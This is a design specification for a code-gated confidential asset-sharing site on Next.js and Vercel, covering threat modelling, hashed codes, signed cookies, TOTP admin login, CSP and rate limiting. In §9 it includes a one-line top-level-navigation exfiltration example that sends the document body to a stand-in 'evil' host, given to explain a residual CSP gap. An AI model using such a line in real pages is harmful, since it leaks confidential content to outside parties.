# Gated Asset Sharing Site — Design Spec

**Date:** 2026-07-01
**Status:** Approved design, pending implementation plan
**Repo:** github.com/oren-datanation/share-site

## 1. Purpose

A single-admin website for publishing self-contained interactive HTML "assets" (client
reports, dashboards, etc.) gated behind access codes. Content is confidential and shared
to select external recipients. Publishing is git-native: the admin adds an HTML file,
commits, opens a PR to `main`, and Vercel deploys. Access codes are managed at runtime
through a web admin panel (not git).

"Assets" is the chosen term — the content is not always reports.

## 2. Core decisions (from brainstorming)

- **Code management:** web admin panel backed by a database (not a git-committed file).
- **Code ↔ asset:** one code unlocks one asset; an asset can have many codes (per-recipient),
  so codes can be expired/revoked individually.
- **Recipient access:** shareable link with the code embedded (`/a/<slug>?code=XXX`), one click,
  no typing.
- **Admin auth:** master password **plus** TOTP 2FA.
- **Expiration:** optional to set; default **90 days** if unset; overridable per code
  (absolute date or duration); **instant revoke** always available.
- **Reuse:** codes are reusable until they expire or are revoked.
- **Asset content:** fully self-contained single HTML files to start; storage layout keeps
  the door open for sidecar assets (option B) later.

## 3. Threat model & accepted residual risk

- The **access code is the entire security boundary.** All mechanisms below exist to protect it.
- **Codes are stored hashed, never in plaintext (D3).** Only `SHA-256(code)` is persisted (§5); the raw
  code exists only transiently at generation time and in the recipient's link. A DB read, backup, or the
  §11 export therefore leaks **no usable codes**. A fast hash is sufficient because a 128-bit code has no
  offline-guessing surface. (This closes the gap that the admin password is hashed but codes were not.)
- **The reusable code travels in the URL — broad incidental-exposure surface (D4).** The redemption
  request `GET /a/<slug>?code=XXX` puts the *reusable bearer code* in a query string, so it can be
  captured by far more than Vercel's logs: **platform request logs, browser history and cross-device
  history sync, endpoint/DLP telemetry, email-security link scanners, chat/link unfurlers, corporate
  proxies, and URL-preview services** — all before or independent of the app. Hashing at rest (D3)
  does **not** help here; the raw code is in transit and at rest in these third-party systems.
  - Mitigations available *within* the current model: short Vercel log retention; restrict who can
    read deployment logs (do **not** assume that population equals the code-minters — CI, integrations,
    and support tooling may also see logs); `Referrer-Policy: no-referrer` and code-stripping redirect
    (§6/§9); and **revoke + reissue** as the standing response to any suspected exposure.
  - **This is the single largest residual and it is only *partially* mitigated.** See the **Open
    design questions (§15)** for two alternatives that keep one-click UX while removing the *reusable*
    code from the URL (short-lived one-time redemption token; fragment + same-origin POST). The design
    currently *accepts* the query-string model per the reusable-link decision (§2/D1); §15 records the
    decision to revisit rather than silently burying the tradeoff.
- **Accepted tradeoff (D1):** because links are reusable and shared as URLs, whoever holds the
  original link+code can view the asset until it expires or is revoked. This is the cost of the
  one-click convenience model. Response to a leaked link is **revoke + reissue**. The design
  minimizes *incidental* leakage (address bar, logs, Referer, script exfiltration) but does not
  attempt device-locking or one-time-view semantics (explicitly declined).
- **Confidentiality of client identity (D2):** public slugs are **opaque, fixed-length** tokens
  (e.g. `/a/A7fK9dZ2qR3sT1uV5wXyB0`) so URLs don't reveal who the clients are. Friendly labels
  live only in the admin panel. See §7 for how opacity is generated and enforced.
- **Enumeration resistance = entropy, not response parity.** A successful redemption returns a
  `302` and a failure returns a `200` — these are inherently distinguishable at the network layer,
  so response indistinguishability is *not* the anti-enumeration defense. The defense is the
  **128-bit CSPRNG code** (and fixed-length opaque slug): a valid `(slug, code)` pair cannot be
  found by guessing. Response byte-parity is kept only for the **failure-vs-failure** case
  (unknown slug vs wrong code look identical) so a prober can't distinguish "no such asset" from
  "asset exists, bad code." Rate limiting is defense-in-depth.
- **CSP residual (accepted, but the "trusted admin" framing is optimistic).** The `'self'` CSP (§9)
  blocks *background* exfiltration (fetch/XHR/beacon/img/websocket) but **cannot** block
  top-level-navigation exfiltration of the asset body (no CSP directive reliably governs
  `window.location` assignment; `navigate-to` is unsupported in most browsers). The design accepts
  this because assets are admin-authored — but "trusted admin" covers only *malice*, not the more
  likely failure: **an authoring mistake or third-party snippet/library copied into a report** that
  navigates the top frame. Any inline script in the asset can send the whole confidential document
  this way. The structural fix is a **sandboxed iframe without `allow-top-navigation`** (§14/§15);
  it is still deferred, but §15 elevates it from "future nicety" to "recommended reconsideration"
  and states the accepted risk honestly.
- **Availability tradeoff — fail closed on DB error.** Every asset load re-checks the code in the
  DB (§6) to keep revocation instant; if the DB is unavailable the load is **denied** (correctness
  over availability, appropriate for confidential content). Blast radius is bounded by using
  Neon's serverless HTTP driver + short query timeouts (§6/§10).

## 4. Stack

- **Next.js (App Router) + TypeScript**, deployed on Vercel.
- **Vercel Postgres (Neon) + Drizzle ORM** — schema and migrations versioned in git.
- One app: gate route, admin UI, auth, DB access.
- **No static surface — the gate is inherently dynamic, and the build has no database (D5).** Because
  every protected response is DB-gated and fail-closed (§3, §6), **nothing sensitive may be
  statically prerendered or edge-cached** — there must exist no build-time artifact of gated content
  that could be served without the per-request code/cookie check. This is a *positive security
  property* reinforcing "the serverless function is the only door" (§7): protected routes
  (`/a/[slug]`, `/admin/*`) render per-request only. Two consequences the implementation MUST honor:
  (a) mark those routes non-prerenderable (App Router `dynamic = 'force-dynamic'`), and (b) the DB
  client MUST tolerate being **imported at build time with no connection string** — `next build`
  imports route modules, and `DATABASE_URL` is not present then — so connect **lazily on first
  query**, never at module load. A build that eagerly connects, or a route that prerenders, either
  breaks the build or bakes a cacheable representation of gated content; both are defects.

## 5. Data model

### `assets` (optional, derived from manifest — see §7)
Assets are defined by files in the repo; the DB does not own them. The runtime source of truth
for "which assets exist" is the build-generated manifest. The admin panel reads the manifest.

### `codes` table

| column | notes |
|---|---|
| `id` | uuid primary key (the `code_id` referenced by the asset cookie) |
| `code_hash` | **SHA-256 of the access code**, unique + indexed. The raw code is `crypto.randomBytes(16)` → base64url (**128-bit, CSPRNG**); only its hash is stored — the **raw code is never persisted** (shown once at creation, §8). Redemption looks up by `SHA-256(code)`. On the (astronomically unlikely) unique-violation at generation, **retry with a new code** — surface nothing about the collision. See D3 (§3). |
| `asset_slug` | opaque slug of the asset this code unlocks |
| `label` | admin-only recipient note, e.g. "Acme Corp – CFO" |
| `created_at` | `TIMESTAMPTZ`, DB `now()` |
| `expires_at` | `TIMESTAMPTZ`; DB-side default `now() + interval '90 days'`; overridable at insert (see predicate below) |
| `revoked_at` | `TIMESTAMPTZ` nullable; set on revoke |
| `last_used_at` | `TIMESTAMPTZ`; set on each redemption |
| `use_count` | incremented on each redemption |

**Validity predicate:** a code is valid iff it exists AND `revoked_at IS NULL` AND
`expires_at > now()`. Lookups are by indexed `code_hash` (redemption) and by `id` (per-load
cookie recheck). **Single trusted time source = the database.** `created_at`, the default
`expires_at`, and every `expires_at > now()` / `last_used_at` comparison use **DB time**, never
app/serverless wall-clock (which can drift across regions). The 90-day default is a DB-side column
default — `expires_at TIMESTAMPTZ DEFAULT (now() + interval '90 days')` (a non-constant default
expression is valid Postgres) — and a per-code override is written explicitly at insert; both are
therefore anchored to the same clock. Use `TIMESTAMPTZ` throughout to avoid timezone ambiguity.

**`use_count` semantics:** it counts **redemptions** (a `?code=` link exchange), not distinct
viewers or page views. Because the asset cookie has a 24h TTL (§6), the same recipient re-redeems
periodically and increments the count. The admin UI must label it "redemptions," not "views," so
it isn't over-trusted. (§14 declines a fuller audit log as YAGNI.)

### Supporting tables (shared serverless state)

Serverless has no shared in-memory state, so the following live in Postgres (single datastore —
see §9; Vercel KV is a viable alternative if `/a/*` rate-limit volume ever grows):

| table | purpose |
|---|---|
| `totp_used_steps` | `step BIGINT PRIMARY KEY, used_at TIMESTAMPTZ`. The **exact matched** TOTP time-step is inserted **only after the password also verifies** (so a wrong-password attempt can neither burn steps nor probe replay state); a unique-violation on insert = **replay → reject** (§8). Single admin, so `step` alone suffices as the key; if multi-admin is ever added (§14) re-key to `(admin_id, step)`. Reusing the *same* 6-digit code inside its 30s window is correctly rejected as replay — the admin waits for the next code. Rows older than the ±1 acceptance window are pruned lazily. |
| `rate_limits` | `key TEXT PRIMARY KEY, count INT, window_start TIMESTAMPTZ`. Backs the per-slug/global and login rate limiters (§9); windows compared using DB `now()` (single time source, §5); pruned lazily on read. Increments **MUST be atomic** — a single `INSERT ... ON CONFLICT (key) DO UPDATE SET count = count + 1` (with window reset when `window_start` is stale) — not read-then-write, which under-counts under concurrency. |

## 6. Access flow (gate + redemption)

Redemption-redirect model — keeps the code out of the URL bar and out of JavaScript's reach:

1. Recipient opens `/a/<slug>?code=XXX`.
2. **Redemption precedence:** if `?code=` is present, the server **always** validates it and
   re-issues a fresh cookie, ignoring any existing cookie. (This makes a re-clicked link
   authoritative even after a cookie-secret rotation.) The code check: exists, not revoked, not
   expired, `asset_slug` matches `<slug>`.
3. **On failure:** a single generic "This link is invalid or has expired" page. This page is
   **byte-identical** (same `200` body/headers) whether the slug is unknown or the code is wrong,
   so a prober can't distinguish "no such asset" from "asset exists, bad code." Note: this parity
   is only about failure-vs-failure — a *success* returns a `302`, which is inherently
   distinguishable; anti-enumeration rests on 128-bit entropy (§3), not on hiding the 302.
   - **Uniform failure code path (no timing oracle):** because the primary lookup is by
     `SHA-256(code)` (§5) and the slug is validated *against the matched code's* `asset_slug`, the
     server MUST NOT short-circuit on "slug not in manifest" *before* the code lookup — an early
     return would make unknown-slug measurably faster than wrong-code and reintroduce the
     distinction the byte-identical body removes. Always perform the constant-work code lookup, then
     compare `asset_slug`, then fail. Byte-parity covers the body/headers; path-uniformity covers timing.
   - **Which timing distinctions are in scope (be explicit — perfect parity is neither achievable
     nor load-bearing; entropy is the defense, §3):**
     - *Must be uniform:* **unknown-slug vs wrong-code** when a `?code=` is present — both must run
       the same code lookup + `asset_slug` compare before the identical failure response.
     - *Accepted as distinguishable (leaks nothing useful):* a **malformed slug** (fails the
       `^[A-Za-z0-9_-]{22}$` shape check, §6 step 5) may fast-reject — it only reveals "not a
       well-formed slug," not whether any asset exists. Likewise a **rate-limited** request may
       return early. These reveal request *shape*, not the `(slug, code)` relationship.
     - *Not attacker-reachable:* the **missing-asset-file** branch (§13 error handling) only fires
       after a *valid* code, so its timing isn't a probing oracle.
4. **On success (redemption):**
   - **Validate and record usage in one atomic step, then issue the cookie only if it succeeds.**
     Use a single conditional statement — e.g. `UPDATE codes SET use_count = use_count + 1,
     last_used_at = now() WHERE code_hash = $1 AND revoked_at IS NULL AND expires_at > now()
     AND asset_slug = $2 RETURNING id, LEAST(now() + interval '24 hours', expires_at) AS cookie_exp`
     — so validity check, usage write, **and the cookie's expiry are all computed in one DB
     transaction on DB time** (§5's single-trusted-clock rule; never re-derive expiry from
     serverless wall-clock). **If it returns a row → issue the cookie (using the returned `id` and
     `cookie_exp`). If it returns no row → treat as failure (step 3). If the statement errors/times
     out → fail closed (§3), issue no cookie.** Never issue access without a successful atomic write,
     and never write usage without issuing access.
   - Set a signed cookie `asset_access_<slug>`: **HttpOnly, Secure, SameSite=Lax,
     `Path=/a/<slug>`**. Payload binds `{v, kid, slug, code_id, iat, cookie_exp}` — never the raw
     code, nothing JS-readable. **`cookie_exp` is the DB-returned value** from the atomic UPDATE
     above (`LEAST(now() + interval '24 hours', expires_at)`, i.e. capped by both the 24h TTL and
     `code.expires_at`), and `iat` is likewise DB time — this is the cookie's *own* TTL, not an
     authorization check; the authoritative revocation/expiry check is always the per-load DB lookup
     on `code_id` (step 5). **Concrete token format** (avoids canonicalization/rotation bypasses): a
     `v` schema-version and `kid` key-id, a **canonical encoding** — prefer a **fixed binary layout**,
     or if JSON is used it MUST pass through a parser/canonicalizer that **rejects duplicate object
     keys** (plain `JSON.parse` silently drops duplicates, so it cannot enforce this) — emitted as
     base64url segments, an **HMAC-SHA256** over the exact encoded bytes using the `kid`-selected
     `ASSET_COOKIE_SECRET` (key ring — §10), verified with a **length check then constant-time**
     comparison, and **strict schema validation** that rejects unknown/duplicate/missing fields and
     any `v`/`kid` not recognized. The cookie's `Max-Age` mirrors `cookie_exp`; because the payload
     is signed, a tampered `Max-Age` can't extend access (it breaks the signature).
   - **302-redirect to `/a/<slug>`** (code stripped from the URL). The redirect response carries
     `Cache-Control: no-store` (§9) so the code-bearing URL and any body are not cached.
   - **`SameSite=Lax` is required** (not Strict): Strict would drop the cookie on the initial
     cross-site link click (from email/chat), breaking the one-click flow. The residual — an
     attacker can *trigger* (but not read, per SOP + `frame-ancestors 'none'`) an asset load in a
     victim's context — is bounded and accepted.
5. On the clean `/a/<slug>` load with **no `?code=`**: first **validate the path `<slug>` against
   `^[A-Za-z0-9_-]{22}$`** before it touches the DB or filesystem (defense-in-depth against path
   traversal / injection — see §7; the code/cookie check should already make a bad slug
   unreachable, but the runtime enforces shape independently, not just the build step). Then verify
   the cookie signature (and that its `{slug}` matches the path). If the signature is invalid/absent
   → generic failure page (no `?code=` to fall back to). If valid → do a **cheap indexed DB lookup
   on `code_id`** to confirm the code is still valid (not revoked/expired). **This DB recheck is
   mandatory and runs even for a signature-valid cookie that was exempted from the rate limiter
   (§9)** — the signature only gates the limiter skip, never authorization. This is what makes
   **revocation effectively instant** — it takes effect on the next load. Usage is **not** re-written
   on these loads.
   - **Fail closed on DB error (§3):** if the lookup errors/times out, the load is **denied**
     (generic page), not served from the cookie alone. Use Neon's serverless HTTP driver
     (`@neondatabase/serverless`) with a short timeout so a blip fails fast rather than hanging.
   - **No conditional per-cookie messaging (avoids a cookie-validity oracle).** An earlier draft
     branched the copy on "signature-valid-but-lapsed" cookies to help returning recipients; that
     branch is **dropped** — it lets anyone holding an old signed cookie distinguish "revoked/expired
     legitimate access" from "invalid," a small but real oracle. Instead, the **single byte-identical
     failure page (step 3) carries static, generic-but-helpful copy for everyone**: *"This link is
     invalid or has expired. If you were sent a link, please re-open it from your original message,
     or contact the sender."* This helps the lapsed-cookie recipient (their fix genuinely is
     re-open-the-link) **without any conditional branch**, so parity holds for unknown-slug,
     wrong-code, and absent/invalid/valid-but-lapsed cookies alike.
6. The asset HTML is read from disk (§7) and returned with the headers in §9.

**Cookie TTL: 24 hours** (and never beyond the code's `expires_at`). After it lapses, re-opening
the original link re-redeems (per step 2). The per-load DB check (step 5) already gives instant
revocation regardless of TTL; the 24h bound exists only to cap a stolen-cookie window on a device
that can't reach the original link. Because re-redemption re-runs step 4, `use_count` reflects
redemptions, not distinct viewers (§5).

## 7. Asset storage, manifest & serving

- Assets stored as **`assets/<slug>/index.html`** (folder-per-asset). `<slug>` is an **opaque,
  fixed-length token**: exactly **22 base64url chars** = `crypto.randomBytes(16)` (128-bit), so
  no slug can be a path-prefix of another (closes the cookie-`Path` prefix-collision class, §6).
  The friendly title lives in the HTML `<title>` and/or the admin label.
- **How the slug is created (resolving the git-native flow):** publishing is hand-authored, so
  the admin does **not** invent folder names. A helper — `npm run new-asset` — mints the token,
  scaffolds `assets/<token>/index.html`, and prints the slug. The admin then edits that file,
  commits, and PRs. (This is the piece that makes opacity/uniqueness a *generated* property rather
  than human discipline.)
- **Build step** scans `assets/*/`, and for each:
  - extracts `<title>` (falls back to the slug if missing),
  - **fails the build loudly** on: a duplicate slug; a slug not matching `^[A-Za-z0-9_-]{22}$`; or a
    slug **not present in the generator registry** (see below). The registry check — not the shape
    check — is what actually closes the D2 backstop.
  - **best-effort external-origin scan (advisory, NOT the enforcement boundary).** HTML/CSS can
    reference external origins through many surfaces — `src`/`href`, `srcset`, CSS `url()` / `@import`,
    SVG `<use href>`, `<meta http-equiv=refresh>`, `<form action>`, import maps, and URLs built at
    runtime in JS — which a regex cannot fully catch. **CSP (§9) is the real containment boundary;**
    this scan is a lint that catches obvious mistakes and keeps assets CSP-compatible. If it is to be
    relied on at all, it MUST use a real HTML/CSS parser with an explicit denied-construct list, and
    §13 tests it against `srcset`, CSS `@import`, SVG, and `meta refresh`. It does not, and cannot,
    catch runtime-constructed navigation (that is the §3/§15 top-nav residual).
  - writes the manifest (slug → title) to a **non-served path outside the asset root** — e.g.
    `.generated/assets-manifest.json` or a compiled TS module — **never** `assets/manifest.json`
    (which sits inside the tree bundled/served for `/a/*`). The admin panel and code-validation
    import it server-side.
- **Generator registry (closes the "readable 22-char folder" residual, D2).** `npm run new-asset`
  appends each minted token to a committed registry (e.g. `.generated/slugs.json`). The build
  **rejects any asset folder whose slug is not in the registry**, so a human cannot hand-create a
  word-like 22-char folder such as `AcmeCorpQ4BoardDeck1` (which passes the shape regex but leaks
  client identity) — it would fail the build for lacking a registry entry. Shape check enforces
  format; registry check enforces provenance/entropy.
- **Serving:** the gate route reads `assets/<slug>/index.html` and returns it only after the
  checks in §6, and **only after the runtime slug-shape check** (`^[A-Za-z0-9_-]{22}$`, §6 step 5)
  so a slug can never be used to construct a traversal path. Files are **never** in `/public`; the
  serverless function is the only door — and it renders **per-request only, never prerendered**
  (D5, §4), so no cacheable copy of a gated asset exists outside the code/cookie check.
- **The manifest is confidential and server-only (D2).** The slug→title map aggregates every client
  identity, so it lives at a **non-served path outside the asset tree** (above) — never in `/public`,
  never inside `assets/` where a stray route could reach it, never served by any route. Only
  server-side code (admin panel, code-validation) imports it. §13 adds deny tests asserting
  `/assets/manifest.json`, `/a/manifest.json`, and `/a/<slug>/manifest.json` all 404. A manifest leak
  would defeat the opaque-slug protection even though individual slugs stay opaque.
- **Cookie `Path` scoping is fine for the single-`index.html` model, but re-evaluate for sidecars
  (§14).** With one `index.html` per slug there are no subpaths, so `Path=/a/<slug>` (§6) grants no
  ambient authority. When sidecar/multi-file assets arrive, that cookie would be sent to every
  subpath under `/a/<slug>/…`; each such resource must then enforce the same authorization check (or
  be served via separate signed, non-cookie URLs). Note `__Host-` cookies are **not** an option here
  — they require `Path=/`, which is incompatible with per-slug path scoping.
- **Bundling (must be verified early — see §12 spike):** ensure `assets/**` is traced into the
  deployed lambda via `outputFileTracingIncludes` (e.g. `'app/a/[slug]/**': ['./assets/**']`)
  with runtime path resolved from `process.cwd()`, **or** a build-generated module map that
  imports the HTML as strings. Prefer whichever is proven deterministic on a real Vercel deploy.

## 8. Admin authentication & panel

- **`/admin/login`:** master password + 6-digit TOTP.
- **Password:** stored in env var `ADMIN_PASSWORD_HASH` as a **memory-hard KDF hash — argon2id**
  (bcrypt acceptable) — **not** a plain fast hash. A human-chosen master password has limited
  entropy, so if the hash ever leaks (env-var exposure, §8 recovery note) a fast hash would be
  offline-brute-forceable; a memory-hard KDF is the control. Verification uses the KDF's own verify
  routine (which is constant-time); there is no separate "constant-time compare" of raw hashes.
  A one-time local **`npm run hash-password`** helper generates the argon2id hash to paste into the
  env var (this is also how the initial value is bootstrapped). Rotate by regenerating and changing
  the env var. **Pin concrete parameters** (don't accept library defaults blindly): argon2id with
  ≥19 MiB memory, ≥2 iterations, parallelism 1 (per current OWASP guidance), reviewed periodically;
  if bcrypt is used instead, cost ≥ 12.
- **TOTP:** secret in `ADMIN_TOTP_SECRET`; a one-time local setup script prints a QR code to scan.
  Verification uses a **±1-step window** (clock-skew tolerance). **Replay rejection** is backed by
  the `totp_used_steps` table (§5): on success the consumed time-step is inserted; a
  unique-violation means that step was already used → reject. This is the shared-state store the
  control requires (an env-var secret alone cannot track used steps).
- **Recovery:** losing the authenticator is recovered by **re-running the local TOTP setup script**
  (the same script from the setup bullet), which mints a *new* secret and prints its QR, then
  setting `ADMIN_TOTP_SECRET` in the Vercel dashboard to that new secret and scanning the QR.
  (Setting a random env var by hand is not enough — the secret and the QR must be generated together
  by the script, or the authenticator won't match.) **Note:** anyone with Vercel project access can
  read/rotate these env vars and thus mint codes — lock down Vercel team access accordingly.
- **Production-only:** all `/admin/*` routes are gated on `VERCEL_ENV === 'production'` and return
  the generic page otherwise. This prevents an admin who lands on a *preview* deployment (which
  has its own throwaway Neon DB, §10) from minting codes into a database that silently won't work
  in production. Codes are only ever generated against the production `/admin`.
- **Session:** on success, a signed **HttpOnly, Secure, SameSite=Strict** session cookie,
  **7-day** expiry, signed with `SESSION_SECRET`. The **expiry lives inside the signed payload**
  (`{v, kid, iat, exp}`, same canonical-encoding/`kid`-key-ring discipline as the asset cookie, §6),
  and the server enforces `exp` server-side regardless of the cookie's `Max-Age` attribute — so a
  tampered attribute or a rotation slip can't extend a session. Middleware guards all `/admin/*`
  routes except the login page.
- **CSRF:** all admin state-changing actions are **POST-only** with an explicit header policy:
  **require `Origin` to equal the production origin**; if `Origin` is absent (some same-origin POSTs
  omit it), fall back to a `Referer` same-origin check; treat **cross-site, malformed, or
  missing-without-a-valid-fallback** as reject. `Sec-Fetch-Site: same-origin` is accepted as
  corroboration but is **not** required (not universally sent). SameSite=Strict remains
  defense-in-depth, not the sole control.
- **Rate limiting** on the login endpoint (shared store — see §9). Because there is a **single
  admin**, a hard lockout is itself a DoS: an attacker hammering `/admin/login` would lock out the
  real admin. Password + TOTP already makes online brute force impractical, so the login limiter
  should **throttle / exponentially back off** (slow attempts, optionally alert) rather than
  hard-lock the account, and MUST NOT lock out on wrong-input volume alone.
- **Panel features:** list assets (from manifest); per asset, list its codes with status
  (active / expired / revoked, `last_used_at`, `use_count`) — the list shows the **label and status
  only, never the code value** (only the hash is stored, §5); generate a code (choose asset, set
  label, optional expiry → default 90 days); **at generation time, and only then, display the raw
  code / full shareable link once for the admin to copy** (API-key style — it cannot be recovered
  later because it isn't persisted); revoke a code. If a link is lost, the flow is **revoke +
  reissue** (mint a new code), consistent with §3. **Flag orphaned codes** whose `asset_slug` is no
  longer in the manifest (asset renamed/deleted).

## 9. Security headers & crawler defense

- **`robots.txt`:** `User-agent: *` / `Disallow: /`.
- **`X-Robots-Tag: noindex, nofollow, noarchive`** on every response.
- **`Referrer-Policy: no-referrer`** — so a `?code=` (present only on the pre-redirect request)
  never leaks via `Referer`.
- **`Cache-Control: no-store`** on **all** gate responses (redemption `302`, asset `200`, and the
  failure page). Confidential asset HTML must never be written to a browser/proxy disk cache on a
  shared machine, and the code-bearing redemption URL must not be cached. Pair with `Pragma: no-cache`
  for legacy intermediaries.
- **`Strict-Transport-Security: max-age=63072000`** — the content is confidential and links travel
  over untrusted channels; HSTS prevents a downgrade that would expose a `?code=`. Add
  **`includeSubDomains` (and later `preload`) only after confirming the apex and *all* subdomains are
  HTTPS-clean** — otherwise it can break unrelated services on the domain. Start without it if unsure.
- **`X-Content-Type-Options: nosniff`** — the gate returns HTML from a function; prevent MIME sniffing.
- **Content-Security-Policy on asset responses** (feasible because assets are self-contained):
  `default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
  connect-src 'self'; img-src 'self' data:; object-src 'none'; frame-src 'none'; worker-src 'none';
  form-action 'self'; frame-ancestors 'none'; base-uri 'none'`. (`object-src`/`frame-src`/`worker-src`
  are set to `'none'` explicitly rather than leaning on the `default-src` fallback, closing the
  plugin/embed/worker vectors across browser versions. `navigate-to 'self'` would help against
  top-nav exfiltration but is omitted as unsupported in current browsers — sandboxing (§15) is the
  real mitigation there.) Inline scripts still run (interactivity preserved). **What this does and
  doesn't buy (accurate framing):** it blocks *background* exfiltration channels — fetch/XHR,
  `sendBeacon`, `<img>`/`<a ping>`, WebSocket — to any non-`'self'` origin, and the HttpOnly
  cookie + code-stripping redirect mean scripts can't read the code/cookie anyway. It does **not**
  block top-level-navigation exfiltration of the asset body (`window.location = 'https://evil/#'
  + document body`) — no CSP directive governs that. Accepted residual, but the "trusted admin"
  justification is optimistic (covers malice, not authoring mistakes) — §15 promotes the
  sandboxed-iframe fix to a recommended reconsideration (§3, §14, §15). The build-time
  external-origin scan (§7) is an **advisory lint**, not an enforcement boundary — CSP is the
  boundary; the scan just keeps assets CSP-compatible and future-proofs same-origin sidecars.
- **Admin responses also get a CSP** (the policy above is scoped to *asset* responses). Serve
  `/admin/*` with its own restrictive policy — `default-src 'self'; frame-ancestors 'none';
  base-uri 'none'; object-src 'none'; form-action 'self'` — and avoid `'unsafe-inline'` in the admin
  UI (the admin app is first-party code you control, so it needn't relax script/style like the
  self-contained assets do). This keeps the code-minting surface hardened, not just the gate.
- **Codes are 128-bit CSPRNG** (§5) — entropy is the primary anti-brute-force and anti-enumeration
  defense (§3).
- **Rate limiting** on `/a/*` and `/admin/login` backed by the `rate_limits` Postgres table (§5),
  keyed **per-slug and globally**, not per-IP alone (per-IP is defeated by IP rotation and
  punishes shared-NAT recipients). **Single shared store:** rate limiting and TOTP replay state
  both live in Postgres so there's one datastore, one set of creds, and it works across preview
  Neon branches. Vercel KV (native TTL) is a documented alternative if `/a/*` rate-limit write
  volume ever outgrows Postgres. This is defense-in-depth, not load-bearing.
  - **Never let the limiter deny an already-authenticated load — but "exempt" means limiter-exempt,
    NOT authorization-exempt.** A request carrying a **signature-valid asset cookie** (a recipient
    who already redeemed) MUST skip the `/a/*` limiter so global garbage traffic can't lock out
    legitimate viewers. **Order is precise:** verify the cookie signature *only* to decide whether to
    skip the limiter; then **always** run the per-load DB validity check (§6 step 5) — revoked/expired
    → deny, DB error → fail closed. A stolen or revoked-but-still-signed cookie is "signature-valid"
    but still fails the DB recheck, so it gains nothing from the limiter skip. The limiter thus
    targets **unauthenticated** traffic (`?code=` redemptions and no-valid-cookie failures). This
    keeps the global counter safe as a high-water circuit-breaker; the **per-slug** limiter is the
    primary control (it only penalizes probing a specific known slug), and the **login** limiter
    (single admin) uses throttle/backoff (§8), not hard lockout.
  - **Bound limiter-row cardinality (don't self-DoS Postgres).** Keying per-slug naively lets an
    attacker spray random 22-char slugs and create an unbounded row per slug — a storage/write-amp
    DoS on the shared datastore. Therefore: apply the cheap `^[A-Za-z0-9_-]{22}$` shape check first,
    and **bucket all malformed and non-manifest slugs into a small fixed set of limiter keys** (e.g.
    `bad-shape`, `unknown-slug`) rather than minting a row per value; only **known-manifest** slugs
    get their own per-slug bucket. Prune aggressively via an indexed `window_start`. (This is also
    why a real-slug allowlist — the manifest — must be consulted for keying, without leaking its
    contents in responses.)
- **`/`** is deliberately neutral/blank — no asset listing, nothing to enumerate.

## 10. Secrets & environments

Env vars (Vercel dashboard, never in repo):
`ADMIN_PASSWORD_HASH`, `ADMIN_TOTP_SECRET`, `SESSION_SECRET`, `ASSET_COOKIE_SECRET`
(separate from `SESSION_SECRET`), and the `POSTGRES_*`/Neon connection vars.

- **Preview vs prod are isolated:** preview deployments use a **separate Neon branch database**
  and **separate secrets** from production, so a leaked preview URL doesn't reach the *production*
  DB (avoids depending on Vercel's paid Deployment Protection). **This alone is not sufficient** —
  preview still bundles and serves the confidential asset HTML; see the next bullet.
- **Preview must also gate `/a/*` — admin-only-production is not enough (see §11).** Disabling
  `/admin/*` on preview stops code-*minting*, but preview deployments **still bundle the confidential
  asset HTML from the branch** and **still serve `/a/*`**. Two concrete exposures follow, and both
  MUST be closed:
  1. **Preview DB must be schema-only, never a data clone of prod.** A Neon "branch" is a
     copy-on-write clone of its parent; if the preview branch is cut from prod it contains *real
     valid codes*, which — combined with the bundled asset HTML — makes a leaked preview URL a live
     door into confidential content. Provision the preview DB as an **empty schema** (migrations
     only), never branched from prod data.
  2. **Even with an empty preview DB, the asset HTML is in the build.** Anyone with the preview URL
     plus any preview code (e.g. a QA test code) can read the *real* confidential document. So either
     **gate `/a/*` to production too** (return the generic page on preview, do QA in `vercel dev` /
     local), **or** protect preview with a cheap preview-only shared secret/password (not Vercel's
     paid Deployment Protection), **and** avoid publishing genuinely sensitive assets through PRs
     whose preview deployments are publicly reachable. Pick one and state it (see §15 open question).
- **Rotation via key rings (`kid`), not flag-day swaps.** `SESSION_SECRET` and `ASSET_COOKIE_SECRET`
  are **key rings**: sign with the current `kid`, verify against current + previous, then retire the
  old key. This lets rotation happen without invalidating every admin session / forcing every
  recipient to re-redeem on the same instant. **Rotation is not the response to a suspected code
  exposure** — that response is **revoke + reissue the affected codes** (§3/§8); rotating
  `ASSET_COOKIE_SECRET` only cycles cookies and would leave a leaked code usable.

## 11. Git → Vercel pipeline

- **Branches:** `main` (production), `dev` (integration). Vercel production branch = `main`;
  `dev` and PRs get preview deployments.
- **Publishing an asset:** add `assets/<slug>/index.html` → commit → PR into `main` → merge
  triggers the production deploy → then open `/admin` and generate a code. (A code can only be
  generated for an asset after it's deployed and in the manifest — this matches the workflow.)
- **Migrations:** run as a **gated, `main`-only release step** with advisory locking (CI job or
  deploy hook) — **not** on every build/preview/rollback. This prevents a preview build from
  running a destructive migration against prod and avoids concurrent-deploy migration races.
  **Migrations are forward-only**; a deploy rollback is **code-only, never schema** — so a
  panicked rollback can't hit a schema-behind-code mismatch.
- **Admin is production-only** (§8), **and `/a/*` must be gated on preview too** (§10): production-only
  admin stops code-minting on preview, but preview still bundles and serves confidential asset HTML,
  so the §10 preview controls (schema-only preview DB + gate/protect `/a/*`) are required.
- **DB durability:** all access state is in one Neon DB; free-tier PITR is limited. Keep an
  occasional export so a DB loss doesn't permanently lock out all recipients.
- **Backups/exports are confidential even though codes are hashed (D3).** The DB still holds
  `asset_slug`, recipient **labels (client identities, D2)**, usage timestamps, and expiries — a
  leaked export exposes *who the clients are and the sharing graph*, not just (unusable) code hashes.
  Treat exports as confidential: encrypt at rest, restrict access, set a retention limit, and keep
  recipient labels minimal/non-sensitive where practical.

## 12. Implementation order (notable)

1. **Bundling spike first:** prove `assets/**` is readable from the deployed lambda on a real
   Vercel deploy (§7) before building anything on top of disk reads. This is a known
   "works locally, 404s in prod" trap.
2. DB schema + Drizzle migrations (`codes`, `totp_used_steps`, `rate_limits`); code
   generation/validation logic; Neon serverless HTTP driver wired with a short query timeout.
3. Gate route with redemption-redirect; **atomic validate-and-record redemption** (§6 step 4);
   signed cookie (24h TTL, canonical `{v,kid,slug,code_id,iat,cookie_exp}`, HMAC-SHA256 key ring);
   per-load revocation check with fail-closed-on-DB-error; redemption precedence; single
   byte-identical failure page with static helpful copy; runtime slug-shape check.
4. Admin auth (password + TOTP with `totp_used_steps` replay rejection), production-only gate,
   session, CSRF, rate limiting.
5. Admin panel UI (incl. orphaned-code flagging; `use_count` labeled "redemptions").
